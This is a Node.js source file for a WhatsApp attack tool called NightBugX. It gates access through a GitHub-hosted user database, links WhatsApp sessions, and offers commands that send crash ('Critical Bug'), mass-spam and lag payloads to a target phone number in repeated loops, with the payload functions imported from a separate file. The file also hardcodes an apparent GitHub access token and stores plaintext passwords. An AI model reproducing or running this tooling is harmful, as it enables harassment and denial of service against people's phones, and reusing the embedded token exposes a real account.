const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  delay
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const P = require("pino");
const path = require("path");
const os = require("os");
const readline = require("readline");
const chalk = require("chalk");
const axios = require("axios");

// --- [ CONFIGURATION ] --- //
const GITHUB_TOKEN = "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"; 
const REPO_OWNER = "bintzstore";
const REPO_NAME = "Akses-script";
const FILE_PATH = "users.json";
const API_URL = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
const SESSIONS_DIR = "./sessions";

// Import Attack Functions
const { xForceClose, xDelayHard, iosOver, nasgor, SqLException, XiosVirus, TrashLocIOS } = require("./function/func.js");

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);

let sock;
let currentSender = null;
let loggedInUser = null;

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

const setPrompt = () => {
    const userHost = chalk.bold.green('/bintz@NightBugX');
    const path = chalk.bold.blue(' ~ ');
    const symbol = chalk.white('$ ');
    rl.setPrompt(`${userHost}${path}${symbol}`);
};

function logger(msg, type = "info") {
  if (type === "error") console.log(chalk.bold.red(`\n[!] ${msg}`));
  else if (type === "success") console.log(chalk.bold.green(`\n[+] ${msg}`));
  else if (type === "wait") console.log(chalk.bold.yellow(`\n[*] ${msg}`));
  else console.log(chalk.bold.white(`\n${msg}`));
}

// --- [ GITHUB ENGINE ] --- //
async function fetchDatabase() {
    try {
        const res = await axios.get(API_URL, { 
            headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Cache-Control': 'no-cache' } 
        });
        const content = Buffer.from(res.data.content, 'base64').toString('utf-8');
        return { db: JSON.parse(content), sha: res.data.sha };
    } catch (e) {
        throw new Error("Gagal terhubung ke Database GitHub");
    }
}

async function loginSystem() {
    // 1. Cek apakah ada file session login yang tersimpan
    if (fs.existsSync(SESSION_USER_FILE)) {
        try {
            const savedSession = fs.readJsonSync(SESSION_USER_FILE);
            // Validasi singkat (opsional: bisa tambahkan fetch database untuk cek akun masih aktif/tidak)
            loggedInUser = savedSession;
            console.log(chalk.green(`\n[+] Welcome back, ${chalk.bold(loggedInUser.username)}! Auto-login success.`));
            return true;
        } catch (e) {
            fs.removeSync(SESSION_USER_FILE); // Hapus jika file rusak
        }
    }

    // 2. Jika tidak ada session, tampilkan UI login seperti biasa
    console.clear();
    console.log(chalk.bold.cyan(`
  ╔══════════════════════════════════════╗
  ║   _      ____   ____  _   _   _      ║
  ║  | |    /    \\ / ___|| | | \\ | |     ║
  ║  | |   |  ||  | | __ | | |  \\| |     ║
  ║  | |___|  ||  | |_| || | | |\\  |     ║
  ║  |_____|\\____/ \\____||_| |_| \\_|     ║
  ╚══════════════════════════════════════╝`));
    
    return new Promise((resolve) => {
        rl.question(chalk.bold.green("  [?] Username : "), (user) => {
            rl.question(chalk.bold.green("  [?] Password : "), async (pass) => {
                try {
                    const { db } = await fetchDatabase();
                    const found = db.users.find(u => u.username === user && u.password === pass);
                    if (found) {
                        loggedInUser = found;
                        // SIMPAN SESSION KE FILE LOKAL
                        fs.writeJsonSync(SESSION_USER_FILE, found);
                        logger("LOGIN SUCCESSFUL!", "success");
                        resolve(true);
                    } else {
                        logger("INVALID CREDENTIALS!", "error");
                        process.exit(0);
                    }
                } catch (e) { 
                    logger("DATABASE ERROR!", "error"); 
                    process.exit(1); 
                }
            });
        });
    });
}
// --- [ WHATSAPP ENGINE ] --- //
async function connectToWhatsApp(botNumber) {
  const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  
  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "fatal" }),
    browser: ["Mac OS", "Chrome", "122.0"]
  });

  sock.ev.on("connection.update", async (u) => {
    if (u.connection === "close") connectToWhatsApp(botNumber);
    if (u.connection === "open") {
      currentSender = botNumber;
      logger(`System Online: Connected as ${botNumber}`, "success");
    }
  });

  sock.ev.on("creds.update", saveCreds);

  if (!sock.authState.creds.registered) {
    logger("Requesting Pairing Code...", "wait");
    await delay(12000);
    try {
        const code = await sock.requestPairingCode(botNumber);
        console.log(chalk.bold.cyan(`\n  ┌──────────────────────────────────────┐\n  │  PAIRED CODE : ${chalk.bold.white(code)}       │\n  └──────────────────────────────────────┘\n`));
    } catch (e) { logger("Pairing Failed (428 Rate Limit)", "error"); }
    setPrompt(); rl.prompt(true);
  }
}

// --- [ UI MENU - NIGHTBUGX THEME ] --- //
function displayMenu() {
  console.clear();
  const w = currentSender ? chalk.bold.green("ON") : chalk.bold.red("OFF");
  console.log(chalk.bold.red(`
  ┌──────────────────────────────────────────┐
  │  ███╗   ██╗██████╗ ██╗  ██╗              │
  │  ████╗  ██║██╔══██╗╚██╗██╔╝              │
  │  ██╔██╗ ██║██████╔╝ ╚███╔╝               │
  │  ██║╚██╗██║██╔══██╗ ██╔██╗               │
  │  ██║ ╚████║██████╔╝██╔╝ ██╗              │
  │  ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝              │
  └──────────────────────────────────────────┘`));
  console.log(chalk.bold.cyan(`  [ USER ] » ${chalk.white(loggedInUser.username)} | RANK : ${chalk.magenta(loggedInUser.role.toUpperCase())} | WA: ${w}`)); 
  console.log(chalk.cyan(`  ──────────────────────────────────────────`));
  
  console.log(chalk.bold.white(`  ◢◤ MAIN TERMINAL COMMANDS`));
  console.log(chalk.bold.cyan(`  core:system`));
  console.log(chalk.white(`  │ ├─ addsender  ${chalk.magenta('»')} Link New Device`));
  console.log(chalk.white(`  │ ├─ listsender ${chalk.magenta('»')} Active Session`));
  console.log(chalk.white(`  │ ├─ infoAcc    ${chalk.magenta('»')} View Profile`));
  console.log(chalk.white(`  │ └─ logout     ${chalk.magenta('»')} Terminate Session`));

  console.log(chalk.bold.red(`\n  core:attack`));
  console.log(chalk.white(`  │ ├─ xForceClose ${chalk.magenta('»')} Critical Bug`));
  console.log(chalk.white(`  │ ├─ xBulldozer  ${chalk.magenta('»')} Massive Spam`));
  console.log(chalk.white(`  │ └─ xDelayHard  ${chalk.magenta('»')} Lag Attack`));

  if (loggedInUser.role !== "user") {
    console.log(chalk.bold.yellow(`\n  core:admin`));
    console.log(chalk.white(`  │ ├─ createAcc   ${chalk.magenta('»')} Register User`));
    console.log(chalk.white(`  │ ├─ delAcc      ${chalk.magenta('»')} Terminate User`));
    console.log(chalk.white(`  │ └─ listAcc     ${chalk.magenta('»')} Database List`));
  }
  
  console.log(chalk.cyan(`\n  ──────────────────────────────────────────`));
  setPrompt(); rl.prompt();
}

// --- [ COMMAND HANDLER ] --- //
rl.on('line', async (line) => {
  const args = line.trim().split(/\s+/);
  const command = args[0];
  
  if (!command) { 
    rl.prompt(); 
    return; 
  }

  console.log(""); 

  switch (command) {
    case "menu": displayMenu(); break;
    case "addsender":
        if (!args[1]) logger("Masukkan nomor!", "error");
        else await connectToWhatsApp(args[1].replace(/[^0-9]/g, ""));
        break;
    case "listsender":
        if (currentSender) logger(`Active Sender: ${currentSender}`, "success");
        else logger("No session connected.", "error");
        break;
    case "infoAcc":
        const diff = Math.ceil((new Date(loggedInUser.expired) - new Date()) / 86400000);
        console.log(chalk.bold.cyan(`\n  [ ACCOUNT STATUS ]\n  User: ${loggedInUser.username}\n  Sisa: ${diff <= 0 ? chalk.red("EXPIRED") : chalk.green(diff + " Hari")}\n`));
        break;

    // --- ADMIN ---
    case "listAcc":
        if (loggedInUser.role === "user") { logger("Akses Ditolak!", "error"); break; }
        try {
            const { db } = await fetchDatabase();
            console.log(chalk.bold.yellow(`\n  ◢◤ DATABASE USERS`));
            db.users.forEach((u, i) => {
                const d = Math.ceil((new Date(u.expired) - new Date()) / 86400000);
                console.log(chalk.white(`  ${i+1}. `) + chalk.bold(u.username.padEnd(10)) + chalk.gray(` | `) + (d <= 0 ? chalk.red("EXP") : chalk.green(d + "d")));
            });
            console.log("");
        } catch (e) { logger("Gagal ambil database.", "error"); }
        break;
        
        // --- [ CASE CREATE ACCOUNT ] --- //
    case "createAcc":
        if (loggedInUser.role === "user") { 
            logger("Akses Ditolak: Khusus Premium/Owner!", "error"); 
            break; 
        }
        
        if (!args[4]) { 
            logger("Format: createAcc {user} {pass} {role} {days}", "error"); 
            console.log(chalk.gray("  Contoh: createAcc bintz 123 user 30"));
            break; 
        }

        // Proteksi: Premium tidak boleh buat akun Premium/Owner
        if (loggedInUser.role === "premium" && (args[3] === "premium" || args[3] === "owner")) {
            logger("Premium hanya boleh membuat akun role 'user'!", "error");
            break;
        }

        try {
            const { db, sha } = await fetchDatabase();
            // Cek apakah user sudah ada
            if (db.users.find(u => u.username === args[1])) {
                logger("Username sudah terdaftar!", "error");
                break;
            }

            let expDate = new Date(); 
            expDate.setDate(expDate.getDate() + parseInt(args[4]));
            
            const newUser = { 
                username: args[1], 
                password: args[2], 
                role: args[3].toLowerCase(), 
                expired: expDate.toISOString().split('T')[0] 
            };

            db.users.push(newUser);
            
            await axios.put(API_URL, { 
                message: `Add User ${args[1]} by ${loggedInUser.username}`, 
                content: Buffer.from(JSON.stringify(db, null, 2)).toString('base64'), 
                sha: sha 
            }, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });

            logger(`User ${args[1]} [${args[3]}] Berhasil Dibuat!`, "success");
        } catch (e) { 
            logger("Gagal sinkron database GitHub!", "error"); 
        }
        break;

    // --- [ CASE DELETE ACCOUNT ] --- //
    case "delAcc":
        if (loggedInUser.role === "user") { 
            logger("Akses Ditolak!", "error"); 
            break; 
        }
        
        if (!args[1]) { 
            logger("Format: delAcc {username}", "error"); 
            break; 
        }

        try {
            const { db, sha } = await fetchDatabase();
            const targetUser = db.users.find(u => u.username === args[1]);

            if (!targetUser) {
                logger("User tidak ditemukan!", "error");
                break;
            }

            // Proteksi: Premium tidak boleh hapus sesama Premium atau Owner
            if (loggedInUser.role === "premium" && (targetUser.role === "premium" || targetUser.role === "owner")) {
                logger("Kamu tidak punya izin menghapus akun ini!", "error");
                break;
            }

            // Eksekusi hapus
            db.users = db.users.filter(u => u.username !== args[1]);

            await axios.put(API_URL, { 
                message: `Delete User ${args[1]} by ${loggedInUser.username}`, 
                content: Buffer.from(JSON.stringify(db, null, 2)).toString('base64'), 
                sha: sha 
            }, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });

            logger(`User ${args[1]} Telah Dihapus!`, "success");
        } catch (e) { 
            logger("Gagal menghapus akun!", "error"); 
        }
        break;

    // --- ATTACK ---
    case "xForceClose":
    case "xBulldozer":
    case "xDelayHard":
        if (!sock) logger("Hubungkan WA dulu (addsender)!", "error");
        else if (!args[1]) logger("Masukkan nomor target!", "error");
        else {
            const jid = `${args[1].replace(/[^0-9]/g, "")}@s.whatsapp.net`;
            logger(`Launching attack on ${args[1]}...`, "wait");
            if (command === "xForceClose") for(let i=0; i<50; i++) await xForceClose(sock, jid);
            if (command === "xBulldozer") { await TrashLocIOS(jid); await XiosVirus(sock, jid); await nasgor(sock, jid); }
            if (command === "xDelayHard") for(let i=0; i<200; i++) await xDelayHard(args[1]);
            logger("Attack Successful!", "success");
        }
        break;

    case "logout": process.exit(0); break;
    case "exit": process.exit(0); break;
    default:
     logger(`Command '${command}' not found.`, "error"); break;
  }
  console.log("");
  rl.prompt();
});

// --- [ START ENGINE ] --- //
(async () => {
    // Selalu login paksa setiap start
    if (await loginSystem()) {
        const files = fs.readdirSync(SESSIONS_DIR);
        const dev = files.find(f => f.startsWith("device"));
        if (dev) await connectToWhatsApp(dev.replace("device", ""));
        displayMenu();
    }
})();